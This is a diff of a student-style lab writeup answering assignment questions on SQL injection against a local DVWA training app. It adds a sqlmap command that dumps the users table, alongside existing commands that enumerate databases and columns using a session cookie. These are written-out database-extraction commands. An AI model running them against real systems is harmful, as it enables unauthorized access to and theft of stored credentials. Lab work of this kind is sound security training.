@@ -142,7 +142,7 @@ python exploit.py | ./vuln
 - Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 
 
 **Question 1**: Use sqlmap to get information about all available databases
-**Answer 1**:
+**Answer 1**: <br>
 ## 1. Identify the vulnerable URL: 
 *Let proceed to the cookies when entering ID = 2* 
 
@@ -151,7 +151,6 @@ python exploit.py | ./vuln
 ```sh
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7"    
 ```
-![image](https://github.com/user-attachments/assets/42916b8d-1481-4c4a-a85b-92322cb1efc4)
 
 *Revealing the DVWA tables:*
 ```sh
@@ -169,7 +168,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie=
 
 
 **Question 2**: Use sqlmap to get tables, users information
-**Answer 2**:
+**Answer 2**: <br>
 *To observe the users information within DVWA, we can use:* <br> 
 ```sh
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --columns -T users --batch  
@@ -178,7 +177,13 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie=
 
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
-**Answer 3**:
+**Answer 3**: <br> 
+*Dump usernames and passwords: 
+```sh
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=equ58cpasfj5q82g3niujb7go7" --dump -T users --batch
+```
+![image](https://github.com/user-attachments/assets/740644fb-bc79-4c46-b998-02535fe6b624)
+
 
 
 
